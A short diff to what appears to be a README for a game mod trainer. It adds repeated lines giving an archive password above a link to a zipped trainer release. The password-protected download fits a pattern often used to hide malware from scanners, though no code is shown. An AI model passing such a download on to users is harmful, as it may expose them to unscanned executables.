@@ -7,6 +7,11 @@
 
 <br/>
 
+## PASSWORD: CyanHaul
+## PASSWORD: CyanHaul
+## PASSWORD: CyanHaul
+## PASSWORD: CyanHaul
+
 <a href="https://github.com/CyanKaiserHaul/aniimo-mod-trainer/releases/download/Latest/Aniimo_Trainer_1.3.0.zip">
   <img width="2168" height="725" alt="ChatGPT Image 18 сент  2026 г , 15_07_15" src="https://github.com/user-attachments/assets/3f81c3b2-5d5b-4480-a1c9-b7e059b99997" />
 
